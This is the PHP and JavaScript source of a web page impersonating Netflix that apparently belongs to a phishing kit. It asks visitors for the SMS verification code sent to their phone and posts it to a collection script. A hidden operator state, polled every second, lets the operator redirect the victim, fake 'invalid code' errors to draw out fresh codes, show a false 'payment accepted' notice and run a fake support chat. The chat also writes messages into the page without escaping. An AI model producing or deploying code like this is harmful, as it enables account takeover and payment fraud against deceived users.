<?php
require 'main.php';

$stateFile = __DIR__ . '/admin_state.json';
$smsState = [
    'mode' => 'default',
    'custom_url' => '',
    'instruction' => 'stay_wait',
    'instruction_token' => time(),
    'chat_enabled' => false
];

if (file_exists($stateFile)) {
    $decoded = json_decode(file_get_contents($stateFile), true);
    if (is_array($decoded)) {
        $smsState = array_merge($smsState, $decoded);
    }
}

$smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <style>
        .status {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            text-align: center;
        }

        .status.success {
            background: #e6ffed;
            color: #1b5e20;
            border: 1px solid #a5d6a7;
        }

        .status.info {
            background: #e3f2fd;
            color: #0d47a1;
            border: 1px solid #90caf9;
        }

        .status.error {
            background: #fdecea;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        .support-chat-widget {
            position: fixed;
            right: 18px;
            bottom: 18px;
            z-index: 9999;
        }

        .chat-toggle {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: none;
            background: linear-gradient(135deg, #e50914, #b20710);
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 12px 26px rgba(0, 0, 0, 0.45);
            position: relative;
        }

        .chat-notification {
            position: absolute;
            top: -4px;
            right: -4px;
            min-width: 22px;
            height: 22px;
            border-radius: 999px;
            background: #ff2b2b;
            color: #fff;
            font-size: 12px;
            font-weight: 700;
            display: none;
            align-items: center;
            justify-content: center;
            border: 2px solid #111;
            padding: 0 6px;
            box-sizing: border-box;
        }

        .chat-notification.show { display: inline-flex; }

        .chat-panel {
            display: none;
            width: min(92vw, 360px);
            margin-bottom: 10px;
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 14px;
            overflow: hidden;
            box-shadow: 0 16px 35px rgba(0, 0, 0, 0.5);
        }

        .chat-panel.active { display: block; }

        .chat-topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #171717;
            padding: 12px 14px;
            border-bottom: 1px solid #2a2a2a;
        }

        .chat-title { margin: 0; font-size: 15px; color: #fff; }

        .chat-close {
            background: transparent;
            border: none;
            color: #bbb;
            cursor: pointer;
            font-size: 18px;
        }

        .chat-box {
            background: #050505;
            border: 0;
            border-radius: 0;
            padding: 12px;
            max-height: 280px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .chat-message {
            max-width: 86%;
            padding: 12px 14px;
            border-radius: 14px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
            color: #f5f5f5;
            position: relative;
        }

        .chat-message.admin { background: #1c2d3a; border: 1px solid #2c3e50; align-self: flex-start; }
        .chat-message.user { background: #123015; border: 1px solid #2e7d32; align-self: flex-end; }

        .chat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
            margin-bottom: 6px;
            font-size: 12px;
            color: #cfd8dc;
        }

        .chat-sender {
            font-weight: 700;
            text-transform: capitalize;
        }

        .chat-time {
            font-size: 11px;
            color: #9fb1bd;
        }

        .chat-text {
            font-size: 15px;
            line-height: 1.45;
            color: #fff;
        }

        .chat-meta { font-size: 13px; color: #9e9e9e; }

        .chat-controls {
            display: flex;
            gap: 10px;
            padding: 10px 12px 12px;
            border-top: 1px solid #1f1f1f;
            align-items: center;
        }

        .chat-controls input {
            flex: 1;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid #333;
            background: #0c0c0c;
            color: #f5f5f5;
            font-size: 14px;
            box-shadow: inset 0 0 0 1px #1c1c1c;
        }

        .chat-controls input::placeholder { color: #8c8c8c; }

        .chat-controls button {
            padding: 12px 16px;
            border: none;
            border-radius: 10px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            letter-spacing: 0.3px;
            box-shadow: 0 8px 18px rgba(229, 9, 20, 0.3);
        }

        .chat-controls button:hover { background: #b20710; }

        .form-disabled {
            opacity: 0.6;
            pointer-events: none;
        }

        .hidden { display: none !important; }
    </style>
    <title>Netflix</title>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png" alt="Netflix logo">  </div>
       </header>

<main>

<div class="form">
    <div class="continer">
    <h1>Confirmation</h1>

<?php
$mode = $smsState['mode'];
$instruction = $smsState['instruction'];
$initialForceError = $mode === 'error_verification' || isset($_GET['error']) || isset($_GET['otp_error']) || $instruction === 'otp_error';
$initialState = [
    'mode' => $mode,
    'instruction' => $instruction,
    'instruction_token' => $smsState['instruction_token'] ?? time(),
    'custom_url' => $smsState['custom_url'] ?? '',
    'chat_enabled' => !empty($smsState['chat_enabled']),
    'has_error_param' => isset($_GET['error']) || isset($_GET['otp_error'])
];
?>

    <div id="status-area" class="status" style="display:none;"></div>

    <form action="post.php" method="post" id="otp-form" class="<?php echo $initialForceError ? 'form-disabled' : ''; ?>">
        <div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>
        <div class="coll">
            <input type="text" placeholder="Enter code" name="otp" required>
            <input type="hidden" name="exit" id="otp-exit-flag" <?php echo $initialForceError ? '' : 'disabled'; ?>>
            <div class="but1">
                <button type="submit" id="otp-submit">Confirm</button>
            </div>
        </div>
    </form>

<div class="support-chat-widget" id="support-chat-widget">
    <div class="chat-panel" id="chat-panel">
        <div class="chat-topbar">
            <h3 class="chat-title">Support Chat</h3>
            <button class="chat-close" id="chat-close" type="button">✕</button>
        </div>
        <div class="chat-box" id="chat-box"></div>
        <div class="chat-controls">
            <input type="text" id="chat-input" placeholder="Type a message...">
            <button type="button" id="chat-send">Send</button>
        </div>
    </div>
    <button type="button" class="chat-toggle" id="chat-toggle" aria-label="Open support chat">
        💬
        <span class="chat-notification" id="chat-notification">0</span>
    </button>
</div>

</div>
</div>


</main>
<script>

    const chatPanel = document.getElementById('chat-panel');
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const chatSend = document.getElementById('chat-send');
    const statusArea = document.getElementById('status-area');
    const chatToggle = document.getElementById('chat-toggle');
    const chatClose = document.getElementById('chat-close');
    const chatNotification = document.getElementById('chat-notification');
    const otpForm = document.getElementById('otp-form');
    const otpExitFlag = document.getElementById('otp-exit-flag');
    const otpSubmit = document.getElementById('otp-submit');
    const initialState = <?php echo json_encode($initialState, JSON_UNESCAPED_SLASHES); ?>;

    let currentState = { ...initialState };
    let chatInterval = null;
    let stateInterval = null;
    let isChatOpen = false;
    let unreadCount = 0;
    let lastSeenAdminTimestamp = Number(sessionStorage.getItem('last_admin_msg_ts') || 0);

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const row = document.createElement('div');
            row.className = `chat-message ${entry.sender}`;
            row.innerHTML = `
                <div class="chat-header">
                    <span class="chat-sender">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)}</span>
                    <span class="chat-time">${entry.formatted}</span>
                </div>
                <div class="chat-text">${entry.message.replace(/\n/g, '<br>')}</div>
            `;
            chatBox.appendChild(row);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function openChat(markAsRead = true) {
        isChatOpen = true;
        chatPanel.classList.add('active');
        if (markAsRead) {
            unreadCount = 0;
            chatNotification.classList.remove('show');
        }
    }

    function closeChat() {
        isChatOpen = false;
        chatPanel.classList.remove('active');
    }

    function handleAdminNotifications(messages) {
        const latestAdmin = [...messages].reverse().find((entry) => entry.sender === 'admin');
        if (!latestAdmin) return;

        const adminTimestamp = Number(latestAdmin.timestamp || 0);
        if (adminTimestamp > lastSeenAdminTimestamp) {
            if (!isChatOpen) {
                unreadCount += 1;
                chatNotification.textContent = unreadCount > 9 ? '9+' : String(unreadCount);
                chatNotification.classList.add('show');
                openChat(false);
            } else {
                unreadCount = 0;
                chatNotification.classList.remove('show');
            }

            lastSeenAdminTimestamp = adminTimestamp;
            sessionStorage.setItem('last_admin_msg_ts', String(lastSeenAdminTimestamp));
        }
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.chat_enabled) {
                chatInput.disabled = false;
                chatSend.disabled = false;
                renderChat(data.messages || []);
                handleAdminNotifications(data.messages || []);
            } else {
                closeChat();
                chatInput.disabled = true;
                chatSend.disabled = true;
            }
        } catch (e) {
            console.error('Unable to load chat.', e);
        }
    }

    function toggleChat(enable) {
        if (!chatPanel) return;
        if (enable) {
            chatInput.disabled = false;
            chatSend.disabled = false;
            if (!chatInterval) {
                fetchChat();
                chatInterval = setInterval(fetchChat, 1000);
            }
        } else {
            closeChat();
            chatInput.disabled = true;
            chatSend.disabled = true;
            if (chatInterval) {
                clearInterval(chatInterval);
                chatInterval = null;
            }
        }
    }

    function setFormVisibility(show) {
        if (otpForm) {
            otpForm.classList.toggle('hidden', !show);
        }
    }

    function setFormDisabled(disabled) {
        if (!otpForm) return;
        otpForm.classList.toggle('form-disabled', disabled);
        const otpField = otpForm.querySelector('input[name="otp"]');
        if (otpField) otpField.disabled = disabled;
        if (otpSubmit) otpSubmit.disabled = disabled;
    }

    function toggleExitFlag(enable) {
        if (!otpExitFlag) return;
        if (enable) {
            otpExitFlag.removeAttribute('disabled');
        } else {
            otpExitFlag.setAttribute('disabled', 'disabled');
        }
    }

    function showStatus(type, html) {
        if (!statusArea) return;
        statusArea.style.display = 'block';
        statusArea.className = `status ${type}`;
        statusArea.innerHTML = html;
    }

    function clearStatus() {
        if (!statusArea) return;
        statusArea.style.display = 'none';
        statusArea.className = 'status';
        statusArea.innerHTML = '';
    }

    function handleRedirects(state) {
        if (state.instruction === 'stay_wait') {
            window.location = 'wait.php?next=sms.php';
            return true;
        }

        if (state.mode === 'redirect_wait') {
            window.location = 'wait.php?next=sms.php';
            return true;
        }

        if (state.mode === 'redirect_custom' && state.custom_url) {
            window.location = state.custom_url;
            return true;
        }

        return false;
    }

    function applyState(state, source = 'poll') {
        if (handleRedirects(state)) {
            return;
        }

        clearStatus();
        setFormVisibility(true);
        setFormDisabled(false);
        toggleExitFlag(false);

        const forceError = state.mode === 'error_verification' || state.instruction === 'otp_error' || !!state.has_error_param;

        if (state.instruction === 'otp_pass') {
            showStatus('success', 'Your SMS OTP has been verified successfully.');
            setFormVisibility(false);
            return;
        }

        if (state.mode === 'payment_accept') {
            showStatus('info', '<img src="res/img/loadings.gif" alt="Payment accepted" style="max-width:120px; display:block; margin:0 auto 10px;">\n                <p>Payment has been accepted in the app. Thank you for your confirmation.</p>');
            setFormVisibility(false);
            return;
        }

        if (forceError) {
            showStatus('error', 'Invalid code. Please wait a moment before trying again.');
            setFormDisabled(true);
            toggleExitFlag(true);
            setTimeout(() => setFormDisabled(false), 5000);
        }
    }

    async function pollState() {
        try {
            const response = await fetch('state.php');
            const state = await response.json();
            const nextState = { ...currentState, ...state };
            applyState(nextState, 'poll');
            toggleChat(!!state.chat_enabled);
            currentState = nextState;
        } catch (e) {
            console.error('Unable to poll state', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput || !chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';
        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ sender: 'user', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send chat message', e);
        }
    }

    if (chatToggle) {
        chatToggle.addEventListener('click', () => {
            if (isChatOpen) {
                closeChat();
            } else {
                openChat(true);
                fetchChat();
            }
        });
    }

    if (chatClose) {
        chatClose.addEventListener('click', closeChat);
    }

    if (chatSend) {
        chatSend.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendChatMessage();
            }
        });
    }

    applyState(currentState, 'initial');
    toggleChat(!!currentState.chat_enabled);
    pollState();
    stateInterval = setInterval(pollState, 1000);

</script>
</body>
</html>
